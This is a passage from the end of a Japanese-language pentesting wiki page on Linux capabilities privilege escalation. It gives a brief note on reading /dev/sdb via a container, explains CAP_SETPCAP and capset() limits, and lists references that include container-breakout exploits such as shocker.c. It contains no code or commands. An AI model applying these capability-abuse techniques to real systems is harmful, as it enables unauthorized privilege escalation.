このアプローチでは、デバイス、namespace、permissions が説明どおりに設定されている場合、standard user は container を介して `/dev/sdb` にアクセスし、そこからデータを読み取れる可能性があります。<sup>[[7]](#references)</sup>

### CAP_SETPCAP

file capabilities を備えた現在の Linux kernel では、**`CAP_SETPCAP`** により、thread は bounding set から inheritable set へ capabilities を追加し、bounding set から capabilities を削除し、securebits を変更できます。別の process に任意の capabilities を付与できるわけではありません。その動作が適用されるのは、file-capability のサポートがない pre-2.6.25 kernel の場合に限られます。<sup>[[14]](#references)</sup>

`capset()` system call は、thread 自身の effective、permitted、inheritable sets を調整できます。ただし、新しい permitted set に既存の permitted set 外の capabilities を含めることはできず、inheritable の更新も kernel の制約を受けます。<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation labs](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Linux の Privilege Escalation](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container Basics: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Taking Advantage of Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Abusing access to mount namespaces through /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Why They Exist and How They Work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Understanding Capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - original CAP_DAC_READ_SEARCH Docker breakout exploit by Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux manual page](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu Manpage](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux manual page](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Running containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux manual page](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux manual page](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux manual page](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
